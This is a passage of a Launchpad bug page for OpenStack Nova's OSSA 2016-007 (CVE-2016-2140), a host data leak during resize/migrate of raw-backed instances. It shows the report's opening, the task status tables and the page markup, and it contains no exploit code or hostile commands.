<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr">
  <head>
<base href="https://bugs.launchpad.net/nova/+bug/1548450/+index" />

    <meta charset="UTF-8" />
    <title>Bug #1548450 “[OSSA 2016-007] Host data leak during resize/migra...” : Bugs : OpenStack Compute (nova)</title>
    <link rel="shortcut icon" href="/@@/launchpad.png" />
    <link rel="canonical" href="https://bugs.launchpad.net/bugs/1548450" />
    
      <link rel="alternate" type="application/atom+xml" href="http://feeds.launchpad.net/bugs/1548450/bug.atom" title="Bug 1548450 Feed" />
    

    
  
  <link type="text/css" rel="stylesheet" media="screen, print" href="/+icing/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/combo.css" />


    

    
      <meta name="description" content="First, a caveat. This report is from code inspection only. I haven't attempted to replicate it, and I have no immediate plans to. It's possible it doesn't exist due to an interaction which isn't immediately obvious.

When resizing an instance using the libvirt driver, we run LibvirtDriver.migrate_disk_and_power_off on the source host. If there is no shared storage, data is copied. Specifically, there's a loop in that function which loops over disk info:

            for info in disk_info:
   ..." />
      <meta property="og:description" content="First, a caveat. This report is from code inspection only. I haven't attempted to replicate it, and I have no immediate plans to. It's possible it doesn't exist due to an interaction which isn't immediately obvious.

When resizing an instance using the libvirt driver, we run LibvirtDriver.migrate_disk_and_power_off on the source host. If there is no shared storage, data is copied. Specifically, there's a loop in that function which loops over disk info:

            for info in disk_info:
   ..." />
    

    
    
      <meta property="og:title" content="Bug #1548450 “[OSSA 2016-007] Host data leak during resize/migra...” : Bugs : OpenStack Compute (nova)" />
      <meta property="og:type" content="website" />
      <meta property="og:image" content="/@@/launchpad.png" />
      <meta property="og:url" content="https://bugs.launchpad.net/bugs/1548450" />
      <meta property="og:site_name" content="Launchpad" />
    

    

    
  

  
  
  <script type="text/javascript">
    var LP = {
        cache: {},
        links: {}
    };
  </script>

  

  <script type="text/javascript">var cookie_scope = '; Path=/; Secure; Domain=.launchpad.net';</script>

   <script type="text/javascript" src="/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?yui/yui/yui-min.js&amp;lp/meta.js&amp;yui/loader/loader-min.js"></script>
   <script type="text/javascript">
        var raw = null;
        if (LP.devmode) {
           raw = 'raw';
        }
        YUI.GlobalConfig = {
            combine: true,
            comboBase: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?',
            root: 'yui/',
            filter: raw,
            debug: false,
            fetchCSS: false,
            maxURLLength: 2000,
            groups: {
                lp: {
                    combine: true,
                    base: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?lp/',
                    comboBase: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?',
                    root: 'lp/',
                    // comes from including lp/meta.js
                    modules: LP_MODULES,
                    fetchCSS: false
                }
            }
        }</script>

  <script type="text/javascript">
      // we need this to create a single YUI instance all events and code
      // talks across. All instances of YUI().use should be based off of
      // LPJS instead.
      var LPJS = new YUI();
  </script>



    <script id="base-layout-load-scripts" type="text/javascript">
        //<![CDATA[
        LPJS.use('base', 'node', 'console', 'event',
            'oop', 'lp', 'lp.app.foldables','lp.app.sorttable',
            'lp.app.inlinehelp', 'lp.app.links',
            'lp.bugs.bugtask_index', 'lp.bugs.subscribers',
            'lp.app.ellipsis', 'lp.code.branchmergeproposal.diff',
            'lp.views.global',
             function(Y) {

            Y.on("domready", function () {
                var global_view = new Y.lp.views.Global();
                global_view.render();

                Y.lp.app.sorttable.SortTable.init();
                Y.lp.app.inlinehelp.init_help();
                Y.lp.activate_collapsibles();
                Y.lp.app.foldables.activate();
                Y.lp.app.links.check_valid_lp_links();
            });

            Y.on('lp:context:web_link:changed', function(e) {
                  window.location = e.new_value;
            });
        });
        //]]>
    </script>
    <script id="base-helper-functions" type="text/javascript">
         //<![CDATA[
        // This code is pulled from lp.js that needs to be available on every
        // request. Pulling here to get it outside the scope of the YUI block.
        function setFocusByName(name) {
            // Focus the first element matching the given name which can be focused.
            var nodes = document.getElementsByName(name);
            var i, node;
            for (i = 0; i < nodes.length; i++) {
                node = nodes[i];
                if (node.focus) {
                    try {
                        // Trying to focus a hidden element throws an error in IE8.
                        if (node.offsetHeight !== 0) {
                            node.focus();
                        }
                    } catch (e) {
                        LPJS.use('console', function(Y) {
                            Y.log('In setFocusByName(<' +
                                node.tagName + ' type=' + node.type + '>): ' + e);
                        });
                    }
                    break;
                }
            }
        }

        function selectWidget(widget_name, event) {
          if (event && (event.keyCode === 9 || event.keyCode === 13)) {
              // Avoid firing if user is tabbing through or simply pressing
              // enter to submit the form.
              return;
          }
          document.getElementById(widget_name).checked = true;
        }
        //]]>
    </script>

    
      
      <script type="text/javascript" id="available-official-tags-js">var available_official_tags = ["api", "api-ref", "availability-zones", "cells", "ceph", "cinder", "compute", "conductor", "config", "console", "cyborg", "db", "doc", "ec2", "evacuate", "fault-injection", "gate-failure", "glance", "hyper-v", "i18n", "image-cache", "in-stable-liberty", "in-stable-newton", "in-stable-ocata", "ironic", "kilo-backport-potential", "liberty-backport-potential", "libvirt", "live-migration", "low-hanging-fruit", "lxc", "metadata", "mitaka-backport-potential", "needs-attention", "needs-functional-test", "needs.openstack-version", "network", "neutron", "newton-backport-potential", "nfs", "notifications", "nova-manage", "nova-network", "numa", "ocata-backport-potential", "openstack-version.grizzly", "openstack-version.havana", "openstack-version.icehouse", "openstack-version.juno", "openstack-version.kilo", "openstack-version.liberty", "openstack-version.mitaka", "openstack-version.newton", "openstack-version.ocata", "openstack-version.pike", "ops", "oslo", "pci", "performance", "pike-backport-potential", "placement", "policy", "postgresql", "powervm", "privsep", "queens-backport-potential", "quotas", "race-condition", "reboot", "rebuild", "rescue", "resize", "resource-tracker", "rootwrap", "s390x", "scheduler", "security", "security-groups", "serviceability", "shared-storage", "shelve", "snapshot", "stacktrace", "stein-rc-potential", "testing", "train-rc-potential", "unified-objects", "upgrade", "ussuri-backport-potential", "ussuri-rc-potential", "vgpu", "victoria-rc-potential", "vmware", "volumes", "wallaby-rc-potential", "xen", "xena-rc-potential", "xenserver", "zvm"];</script>
      <script type="text/javascript">
        LPJS.use('base', 'node', 'oop', 'event', 'lp.bugs.bugtask_index',
                  'lp.bugs.subscribers', 'lp.code.branchmergeproposal.diff',
                  'lp.app.comment', 'lp.services.messages.edit', function(Y) {
            Y.on('domready', function() {
                Y.lp.code.branchmergeproposal.diff.connect_diff_links();
                Y.lp.bugs.bugtask_index.setup_bugtask_index();
                Y.lp.bugs.bugtask_index.setup_bugtask_table();
                LP.cache.comment_context = LP.cache.bug;
                var cl = new Y.lp.app.comment.CommentList();
                cl.render();
                var sl = new Y.lp.bugs.subscribers.createBugSubscribersLoader({
                    container_box: '#other-bug-subscribers',
                    subscribers_details_view:
                        '/+bug-portlet-subscribers-details',
                    subscribe_someone_else_link: '.menu-link-addsubscriber'
                }, window);

                Y.lp.services.messages.edit.setup();
            });
         });
      </script>
      <style type="text/css">
        /* Align the 'add comment' link to the right of the comment box. */
        #add-comment-form textarea { width: 100%; }
        #add-comment-form { max-width: 60em; padding-bottom: 4em; }
        #add-comment-form .actions {float: right;}
        .buglink-summary dd { font-size: 10px; }
        a#privacy-link:link:hover, a#privacy-link:visited:hover {text-decoration:none;}
      </style>
      <style type="text/css">
        .yui3-overlay .value label  {
          /* It normally makes sense for form labels to be bold, but since
          this form consists only of radio buttons, there's nothing but labels
          so we just get wall-to-wall bold. */
          font-weight: normal !important;
        }
      </style>
    
    
  </head>

  <body id="document" itemscope="" itemtype="http://schema.org/WebPage" class="tab-bugs
      main_side
      public
      yui3-skin-sam">
          
          
    <div class="yui-d0">
      <div id="locationbar" class="login-logout">
        

<div id="logincontrol"><a href="https://bugs.launchpad.net/nova/+bug/1548450/+login">Log in / Register</a></div>



      </div><!--id="locationbar"-->

      <div id="watermark" class="watermark-apps-portlet">
        <div>
          <a href="https://launchpad.net/nova"><img alt="" width="64" height="64" src="https://launchpadlibrarian.net/324577028/nova64.png" /></a>
        </div>
        <div class="wide">
          <h2 id="watermark-heading"><a href="https://launchpad.net/nova">OpenStack Compute (nova)</a></h2>
        </div>
        
  <!-- Application Menu -->
  <ul class="facetmenu">
    
      
      <li class="overview"><a href="https://launchpad.net/nova">Overview</a></li>
      
    
    
      
      <li class="branches"><a href="https://code.launchpad.net/nova">Code</a></li>
      
    
    
      <li class="bugs active"><a href="https://bugs.launchpad.net/nova">Bugs</a></li>
      
      
    
    
      
      <li class="specifications"><a href="https://blueprints.launchpad.net/nova">Blueprints</a></li>
      
    
    
      
      <li class="translations"><a href="https://translations.launchpad.net/nova">Translations</a></li>
      
    
    
      
      <li class="answers"><a href="https://answers.launchpad.net/nova">Answers</a></li>
      
    
  </ul>

      </div>

      <div class="yui-t4">
        <div id="maincontent" class="yui-main">
          <div class="yui-b" dir="ltr">
            <div class="context-publication">
              
      <h1 id="edit-title">
<span class="yui3-editable_text-text ellipsis" style="max-width: 95%;">
    [OSSA 2016-007] Host data leak during resize/migrate for raw-backed instances (CVE-2016-2140)
</span>
  
</h1>



    
              

              <div id="registration" class="registering">
                
      Bug #1548450 reported by
      <a href="https://launchpad.net/~mbooth-9" class="sprite person">Matthew Booth</a>
      <time title="2016-02-22 18:14:34 UTC" datetime="2016-02-22T18:14:34.238448+00:00">on 2016-02-22</time>
    
              </div>
            </div>

            
            <div id="request-notifications">
              
            </div>

            
              <div>

      

      <div id="bug-is-duplicate">
          
      </div>
      

      <div style="float: right;">
        <span><a href="/+help-bugs/bug-heat.html" target="help" class="sprite flame">18</a></span>
      </div>

      


  
  
    <div class="actions">
      <span id="affectsmetoo" style="display: inline">This bug affects 1 person</span>
    </div>
  



    <table id="affected-software" class="listing">
      <thead>
        <tr>
          <th colspan="2">Affects</th>
          <th>Status</th>
          <th>Importance</th>
          <th>Assigned to</th>
          <th>Milestone</th>
        </tr>
      </thead>

      <tbody>
        
          
  <tr class="highlight" id="tasksummary2004858">
    <td>
      <a class="bugtask-expander" href="https://bugs.launchpad.net/nova/+bug/1548450/+editstatus">
        &#8203;
      </a>
    </td>
    
    <td>
      <span id="bugtarget-picker-tasksummary2004858">
        <span class="yui3-activator-data-box">
            <a class="sprite product" href="https://bugs.launchpad.net/nova">OpenStack Compute (nova)</a>
        </span>
        <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
          Edit
        </button>
        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        
      </span>
    </td>

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/nova/+bug/1548450/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
          <a href="https://bugs.launchpad.net/nova/+bug/1548450/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceCRITICAL">Critical</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary2004858">
          <span class="yui3-activator-data-box">
            <a class="sprite person" href="https://launchpad.net/~lyarwood">Lee Yarwood</a>
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      <div class="milestone-content" style="width: 100%; float: left">
        
        <a class="value" href=""></a>
        
      </div>
    </td>

    
  </tr>

  
    <tr class="bugtask-collapsible-content hidden" id="task2004858">
     <td colspan="7"><form action="/nova/+bug/1548450/+editstatus" method="post" enctype="multipart/form-data">
  

  <p class="error message">
    You need to log in to change this bug's status.
  </p>
  
  <table class="summary" style="float: right; margin-left: 1em;">
    <tr>
      <th>Affecting:</th>
      <td><a href="/nova">OpenStack Compute (nova)</a></td>
    </tr>
    <tr>
      <th>Filed here by:</th>
      <td><a href="https://launchpad.net/~mbooth-9" class="sprite person">Matthew Booth</a></td>
    </tr>
    <tr>
      <th>When:</th>
      <td>
        <time title="2016-02-22 18:14:34 UTC" datetime="2016-02-22T18:14:34.238448+00:00">2016-02-22</time>
      </td>
    </tr>
    <tr>
      <th>Confirmed:</th>
      <td>
        <time title="2016-02-23 19:57:44 UTC" datetime="2016-02-23T19:57:44.661166+00:00">2016-02-23</time>
      </td>
    </tr>
    <tr>
      <th>Assigned:</th>
      <td>
        <time title="2016-03-08 15:02:15 UTC" datetime="2016-03-08T15:02:15.066673+00:00">2016-03-08</time>
      </td>
    </tr>
    <tr>
      <th>Started work:</th>
      <td>
        <time title="2016-03-08 15:02:15 UTC" datetime="2016-03-08T15:02:15.103533+00:00">2016-03-08</time>
      </td>
    </tr>
    <tr>
      <th>Completed:</th>
      <td>
        <time title="2016-03-09 12:59:02 UTC" datetime="2016-03-09T12:59:02.187601+00:00">2016-03-09</time>
      </td>
    </tr>
  </table>
  <div class="field">
    <table>
      <tr>
        <td>
          <label for="nova.target">Target</label>
        </td>
      </tr>
      <tr>
        <td>
          <table>
  <tr>
    <td>
      <label>
        <input class="radioType" id="nova.target.option.package" name="nova.target" type="radio" value="package" />
        Distribution
      </label>
    </td>
    <td>
      <select id="nova.target.distribution" name="nova.target.distribution" size="1" >
<option value="baltix">Baltix</option>
<option value="boss">BOSS</option>
<option value="charms">Juju Charms Collection</option>
<option value="elbuntu">Elbuntu</option>
<option value="guadalinex">Guadalinex</option>
<option value="guadalinexedu">Guadalinex Edu</option>
<option value="kiwilinux">Kiwi Linux</option>
<option value="nubuntu">nUbuntu</option>
<option value="pld-linux">PLD Linux</option>
<option value="tilix">Tilix</option>
<option value="tuxlab">tuXlab</option>
<option selected="selected" value="ubuntu">Ubuntu</option>
<option value="ubuntu-leb">Ubuntu Linaro Evaluation Build</option>
<option value="ubuntu-rtm">Ubuntu RTM</option>
</select>
<input name="nova.target.distribution-empty-marker" type="hidden" value="1" />
    </td>
  </tr>
  <tr>
    <td align="right">
      <label for="nova.target.option.package">
        Package
      </label>
    </td>
    <td>
      


    <input type="text" value="" id="nova.target.package"
                         name="nova.target.package" size="20"
                         maxlength=""
                         onKeyPress="selectWidget(&#x27;nova.target.option.package&#x27;, event)" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('nova.target.package');
              var select_menu = Y.DOM.byId('nova.target.package-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-nova-target-package" href="#">Find&hellip;</a>)</span>
    <script>
    LPJS.use('node', 'lp.app.picker', function(Y) {
        var config = {"remove_person_text": "Remove person", "picker_type": "default", "extra_no_results_message": null, "header": "Select a package", "vocabulary_filters": [], "input_element": "nova.target.package", "show_remove_button": false, "show_assign_me_button": false, "step_title": "Search by name", "show_widget_id": "show-widget-nova-target-package", "selected_value": null, "selected_value_metadata": null, "remove_team_text": "Remove team", "assign_me_text": "Pick me", "show_create_team": false, "vocabulary_name": "DistributionPackage"};
        var show_widget_id = 'show-widget-nova-target-package';
        Y.lp.app.picker.addPicker(config, show_widget_id);
    });
    </script>
  



    </td>
  </tr>

  <tr>
    <td>
      <label>
        <input class="radioType" checked="checked" id="nova.target.option.product" name="nova.target" type="radio" value="product" />
       Project
      </label>
    </td>
    <td>
      


    <input type="text" value="nova" id="nova.target.product"
                         name="nova.target.product" size="20"
                         maxlength=""
                         onKeyPress="selectWidget(&#x27;nova.target.option.product&#x27;, event)" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('nova.target.product');
              var select_menu = Y.DOM.byId('nova.target.product-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-nova-target-product" href="#">Find&hellip;</a>)</span>
    <script>
    LPJS.use('node', 'lp.app.picker', function(Y) {
        var config = {"remove_person_text": "Remove person", "picker_type": "default", "extra_no_results_message": null, "header": "Select a project", "vocabulary_filters": [], "input_element": "nova.target.product", "show_remove_button": false, "show_assign_me_button": false, "step_title": "Search", "show_widget_id": "show-widget-nova-target-product", "selected_value": "nova", "selected_value_metadata": null, "remove_team_text": "Remove team", "assign_me_text": "Pick me", "show_create_team": false, "vocabulary_name": "Product"};
        var show_widget_id = 'show-widget-nova-target-product';
        Y.lp.app.picker.addPicker(config, show_widget_id);
    });
    </script>
  



    </td>
  </tr>
</table>

          
        </td>
      </tr>
    </table>
    
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="nova.status">Status</label>
        </td>
        <td>
          <label style="font-weight: bold" for="nova.importance">Importance</label>
        </td>
        
      </tr>
      <tr>
        <td><div>
<div class="value">
<select id="nova.status" name="nova.status" size="1" >
<option selected="selected" value="Fix Released">Fix Released</option>
</select>
</div>
<input name="nova.status-empty-marker" type="hidden" value="1" />
</div></td>
        <td title="Changeable only by a project maintainer or bug supervisor">
          <span class="sprite read-only"></span>
          <span class="importanceCRITICAL">Critical</span>
        </td>
        
      </tr>
    </table>
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="nova.assignee">Assigned to</label>
        </td>
      </tr>
      <tr>
        <td colspan="2" style="white-space: nowrap">

  <table>
    
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" id="nova.assignee.assign_to_me" name="nova.assignee.option" value="nova.assignee.assign_to_me" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="nova.assignee.assign_to_me">
          Me
        </label>
      </td>
    </tr>
    
      
        <tr>
          <td style="padding: 0 2px 2px 0">
              <input type="radio" checked="checked" id="nova.assignee.assigned_to" name="nova.assignee.option" value="nova.assignee.assigned_to" />
          </td>
          <td style="padding: 0">
            <label style="font-weight: normal" for="nova.assignee.assigned_to">
              Lee Yarwood (lyarwood)
            </label>
          </td>
        </tr>
      
    
    
  </table>


</td>
      </tr>
    </table>
    
  </div>
  <div class="field">
    <div>
      <label style="font-weight: bold" for="nova.comment_on_change">Comment on this change (optional)</label>
      <textarea cols="62" rows="4" id="nova.comment_on_change" name="nova.comment_on_change"></textarea>
    </div>
    <div>
      <label style="font-weight: normal">
        <input type="checkbox" name="subscribe" id="subscribe" value="Subscribe" />
        Email me about changes to this bug report
      </label>
    </div>
  </div>
  
</form>
</td>
    </tr>
  


        
        
          
  <tr id="tasksummary2017127">
    <td>
      <a class="bugtask-expander" href="https://bugs.launchpad.net/nova/kilo/+bug/1548450/+editstatus">
        &#8203;
      </a>
    </td>
    <td style="padding: 0.3em 0em 0.3em 1.5em">
      <span class="sprite milestone"></span>
      
        <a href="https://bugs.launchpad.net/nova/kilo">Kilo</a>
      
        
    </td>
    

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/nova/kilo/+bug/1548450/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
          <a href="https://bugs.launchpad.net/nova/kilo/+bug/1548450/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceCRITICAL">Critical</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary2017127">
          <span class="yui3-activator-data-box">
            <a class="sprite person" href="https://launchpad.net/~lyarwood">Lee Yarwood</a>
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      <div class="milestone-content" style="width: 100%; float: left">
        
        <a class="value" href="https://launchpad.net/nova/+milestone/2015.1.4">OpenStack Compute (nova) 2015.1.4</a>
        
      </div>
    </td>

    
  </tr>

  
    <tr class="bugtask-collapsible-content hidden" id="task2017127">
     <td colspan="7"><form action="/nova/kilo/+bug/1548450/+editstatus" method="post" enctype="multipart/form-data">
  

  <p class="error message">
    You need to log in to change this bug's status.
  </p>
  
  <table class="summary" style="float: right; margin-left: 1em;">
    <tr>
      <th>Affecting:</th>
      <td><a href="/nova/kilo">OpenStack Compute (nova) kilo</a></td>
    </tr>
    <tr>
      <th>Filed here by:</th>
      <td><a href="https://launchpad.net/~mriedem" class="sprite person">Matt Riedemann</a></td>
    </tr>
    <tr>
      <th>When:</th>
      <td>
        <time title="2016-03-10 15:09:46 UTC" datetime="2016-03-10T15:09:46.754992+00:00">2016-03-10</time>
      </td>
    </tr>
    <tr>
      <th>Confirmed:</th>
      <td>
        <time title="2016-03-10 15:09:55 UTC" datetime="2016-03-10T15:09:55.403991+00:00">2016-03-10</time>
      </td>
    </tr>
    <tr>
      <th>Assigned:</th>
      <td>
        <time title="2016-03-10 15:10:53 UTC" datetime="2016-03-10T15:10:53.984964+00:00">2016-03-10</time>
      </td>
    </tr>
    <tr>
      <th>Started work:</th>
      <td>
        <time title="2016-03-10 15:09:55 UTC" datetime="2016-03-10T15:09:55.403991+00:00">2016-03-10</time>
      </td>
    </tr>
    <tr>
      <th>Completed:</th>
      <td>
        <time title="2016-05-10 22:04:06 UTC" datetime="2016-05-10T22:04:06.890344+00:00">2016-05-10</time>
      </td>
    </tr>
  </table>
  <div class="field">
    
    
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="nova_kilo.status">Status</label>
        </td>
        <td>
          <label style="font-weight: bold" for="nova_kilo.importance">Importance</label>
        </td>
        <td>
          <label style="font-weight: bold" for="nova_kilo.milestone">Milestone</label>
        </td>
      </tr>
      <tr>
        <td><div>
<div class="value">
<select id="nova_kilo.status" name="nova_kilo.status" size="1" >
<option selected="selected" value="Fix Released">Fix Released</option>
</select>
</div>
<input name="nova_kilo.status-empty-marker" type="hidden" value="1" />
</div></td>
        <td title="Changeable only by a project maintainer or bug supervisor">
          <span class="sprite read-only"></span>
          <span class="importanceCRITICAL">Critical</span>
        </td>
        <td title="Changeable only by a project maintainer or bug supervisor">
          <span class="sprite read-only"></span>
          OpenStack Compute (nova) 2015.1.4
        </td>
      </tr>
    </table>
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="nova_kilo.assignee">Assigned to</label>
        </td>
      </tr>
      <tr>
        <td colspan="2" style="white-space: nowrap">

  <table>
    
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" id="nova_kilo.assignee.assign_to_me" name="nova_kilo.assignee.option" value="nova_kilo.assignee.assign_to_me" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="nova_kilo.assignee.assign_to_me">
          Me
        </label>
      </td>
    </tr>
    
      
        <tr>
          <td style="padding: 0 2px 2px 0">
              <input type="radio" checked="checked" id="nova_kilo.assignee.assigned_to" name="nova_kilo.assignee.option" value="nova_kilo.assignee.assigned_to" />
          </td>
          <td style="padding: 0">
            <label style="font-weight: normal" for="nova_kilo.assignee.assigned_to">
              Lee Yarwood (lyarwood)
            </label>
          </td>
        </tr>
      
    
    
  </table>


</td>
      </tr>
    </table>
    
  </div>
  <div class="field">
    <div>
      <label style="font-weight: bold" for="nova_kilo.comment_on_change">Comment on this change (optional)</label>
      <textarea cols="62" rows="4" id="nova_kilo.comment_on_change" name="nova_kilo.comment_on_change"></textarea>
    </div>
    <div>
      <label style="font-weight: normal">
        <input type="checkbox" name="subscribe" id="subscribe" value="Subscribe" />
        Email me about changes to this bug report
      </label>
    </div>
  </div>
  
</form>
</td>
    </tr>
  


        
        
          
  <tr id="tasksummary2017128">
    <td>
      <a class="bugtask-expander" href="https://bugs.launchpad.net/nova/liberty/+bug/1548450/+editstatus">
        &#8203;
      </a>
    </td>
    <td style="padding: 0.3em 0em 0.3em 1.5em">
      <span class="sprite milestone"></span>
      
        <a href="https://bugs.launchpad.net/nova/liberty">Liberty</a>
      
        
    </td>
    

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/nova/liberty/+bug/1548450/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
          <a href="https://bugs.launchpad.net/nova/liberty/+bug/1548450/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceCRITICAL">Critical</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary2017128">
          <span class="yui3-activator-data-box">
            <a class="sprite person" href="https://launchpad.net/~lyarwood">Lee Yarwood</a>
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      <div class="milestone-content" style="width: 100%; float: left">
        
        <a class="value" href=""></a>
        
      </div>
    </td>

    
  </tr>

  
    <tr class="bugtask-collapsible-content hidden" id="task2017128">
     <td colspan="7"><form action="/nova/liberty/+bug/1548450/+editstatus" method="post" enctype="multipart/form-data">
  

  <p class="error message">
    You need to log in to change this bug's status.
  </p>
  
  <table class="summary" style="float: right; margin-left: 1em;">
    <tr>
      <th>Affecting:</th>
      <td><a href="/nova/liberty">OpenStack Compute (nova) liberty</a></td>
    </tr>
    <tr>
      <th>Filed here by:</th>
      <td><a href="https://launchpad.net/~mriedem" class="sprite person">Matt Riedemann</a></td>
    </tr>
    <tr>
      <th>When:</th>
      <td>
        <time title="2016-03-10 15:09:46 UTC" datetime="2016-03-10T15:09:46.754992+00:00">2016-03-10</time>
      </td>
    </tr>
    <tr>
      <th>Confirmed:</th>
      <td>
        <time title="2016-03-10 15:09:59 UTC" datetime="2016-03-10T15:09:59.592407+00:00">2016-03-10</time>
      </td>
    </tr>
    <tr>
      <th>Assigned:</th>
      <td>
        <time title="2016-03-10 15:11:01 UTC" datetime="2016-03-10T15:11:01.716664+00:00">2016-03-10</time>
      </td>
    </tr>
    <tr>
      <th>Started work:</th>
      <td>
        <time title="2016-03-10 15:09:59 UTC" datetime="2016-03-10T15:09:59.592407+00:00">2016-03-10</time>
      </td>
    </tr>
    <tr>
      <th>Completed:</th>
      <td>
        <time title="2017-06-16 12:12:22 UTC" datetime="2017-06-16T12:12:22.628745+00:00">2017-06-16</time>
      </td>
    </tr>
  </table>
  <div class="field">
    
    
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="nova_liberty.status">Status</label>
        </td>
        <td>
          <label style="font-weight: bold" for="nova_liberty.importance">Importance</label>
        </td>
        
      </tr>
      <tr>
        <td><div>
<div class="value">
<select id="nova_liberty.status" name="nova_liberty.status" size="1" >
<option selected="selected" value="Fix Released">Fix Released</option>
</select>
</div>
<input name="nova_liberty.status-empty-marker" type="hidden" value="1" />
</div></td>
        <td title="Changeable only by a project maintainer or bug supervisor">
          <span class="sprite read-only"></span>
          <span class="importanceCRITICAL">Critical</span>
        </td>
        
      </tr>
    </table>
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="nova_liberty.assignee">Assigned to</label>
        </td>
      </tr>
      <tr>
        <td colspan="2" style="white-space: nowrap">

  <table>
    
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" id="nova_liberty.assignee.assign_to_me" name="nova_liberty.assignee.option" value="nova_liberty.assignee.assign_to_me" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="nova_liberty.assignee.assign_to_me">
          Me
        </label>
      </td>
    </tr>
    
      
        <tr>
          <td style="padding: 0 2px 2px 0">
              <input type="radio" checked="checked" id="nova_liberty.assignee.assigned_to" name="nova_liberty.assignee.option" value="nova_liberty.assignee.assigned_to" />
          </td>
          <td style="padding: 0">
            <label style="font-weight: normal" for="nova_liberty.assignee.assigned_to">
              Lee Yarwood (lyarwood)
            </label>
          </td>
        </tr>
      
    
    
  </table>


</td>
      </tr>
    </table>
    
  </div>
  <div class="field">
    <div>
      <label style="font-weight: bold" for="nova_liberty.comment_on_change">Comment on this change (optional)</label>
      <textarea cols="62" rows="4" id="nova_liberty.comment_on_change" name="nova_liberty.comment_on_change"></textarea>
    </div>
    <div>
      <label style="font-weight: normal">
        <input type="checkbox" name="subscribe" id="subscribe" value="Subscribe" />
        Email me about changes to this bug report
      </label>
    </div>
  </div>
  
</form>
</td>
    </tr>
  


        
        
          
  <tr id="tasksummary2004890">
    <td>
      <a class="bugtask-expander" href="https://bugs.launchpad.net/ossa/+bug/1548450/+editstatus">
        &#8203;
      </a>
    </td>
    
    <td>
      <span id="bugtarget-picker-tasksummary2004890">
        <span class="yui3-activator-data-box">
            <a class="sprite product" href="https://bugs.launchpad.net/ossa">OpenStack Security Advisory</a>
        </span>
        <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
          Edit
        </button>
        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        
      </span>
    </td>

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/ossa/+bug/1548450/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
          <a href="https://bugs.launchpad.net/ossa/+bug/1548450/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
